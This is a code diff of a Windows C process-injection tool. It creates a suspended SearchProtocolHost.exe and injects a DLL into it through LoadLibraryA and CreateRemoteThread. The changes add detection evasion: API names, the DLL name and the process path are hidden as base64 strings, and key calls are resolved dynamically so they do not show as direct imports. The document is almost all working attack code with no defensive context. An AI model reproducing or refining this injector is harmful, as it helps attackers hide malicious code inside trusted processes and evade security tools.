@@ -13,7 +13,7 @@ void StealthExec(HANDLE hProc, const char *dllN)
     NTSTATUS status;
 
     // Resolve Required Functions
-    pMod pLLoad = GetMod("kernel32.dll", "LoadLibraryA");
+    pMod pLLoad = GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("TG9hZExpYnJhcnlB")); // "LoadLibraryA"
 
     if (!pLLoad)
     {
@@ -54,8 +54,21 @@ void StealthExec(HANDLE hProc, const char *dllN)
         myDebug(DEBUG_SUCCESS, "Successfully write memory.");
     }
 
+    pMod pCRT = GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("Q3JlYXRlUmVtb3RlVGhyZWFk")); //"CreateRemoteThread"
+
+    if (!pCRT)
+    {
+        myDebug(DEBUG_ERROR, "Failed to resolve CreateRemoteThread.");
+        return;
+    }
+    else
+    {
+        myDebug(DEBUG_SUCCESS, "Successfully resolve CreateRemoteThread.");
+    }
+
     // Load Remote DLL
-    hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
+    hThreadRemote = ((pCRT_t)pCRT)(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
+    // hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
     if (!hThreadRemote)
     {
         myDebug(DEBUG_ERROR, "Thread creation failed. Err: %lu", GetLastError());
@@ -101,19 +114,26 @@ int main(int argc, char *argv[])
     STARTUPINFOA sInfo = {0};
     PROCESS_INFORMATION pInfo = {0};
 
-    const char *procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
-    const char *procName = "SearchProtocolHost.exe";
-    // Also work with explorer.exe
-    // const char* procPath = "C:\\Windows\\explorer.exe";
-    // const char *procName = "Explorer.exe";
+    // "C:\\Windows\\System32\\SearchProtocolHost.exe"
+    const char *procPath = "QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxTZWFyY2hQcm90b2NvbEhvc3QuZXhl";
+    // SearchProtocolHost.exe
+    const char *procName = "U2VhcmNoUHJvdG9jb2xIb3N0LmV4ZQ==";
 
-    if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
+    // Resolve CreateProcessA dynamically
+    pCPA_t pCPA = (pCPA_t)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("Q3JlYXRlUHJvY2Vzc0E="));
+
+    if (!pCPA) {
+        printf("[!] Failed to resolve CreateProcessA\n");
+        return -1;
+    }
+
+    if (!pCPA(Bsfd(procPath), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
     {
         myDebug(DEBUG_ERROR, "Could not create %s. Err: %lu", procName, GetLastError());
         return -1;
     }
 
-    myDebug(DEBUG_INFO, "Suspended %s created.", procName);
+    myDebug(DEBUG_INFO, "Suspended %s created.", Bsfd(procName));
 
     // Perform Injection
     StealthExec(pInfo.hProcess, dllPath);
@@ -122,7 +142,7 @@ int main(int argc, char *argv[])
     ResumeThread(pInfo.hThread);
     CloseHandle(pInfo.hProcess);
     CloseHandle(pInfo.hThread);
-    myDebug(DEBUG_INFO, "%s is now running.", procName);
+    myDebug(DEBUG_INFO, "%s is now running.", Bsfd(procName));
 
     return 0;
 }
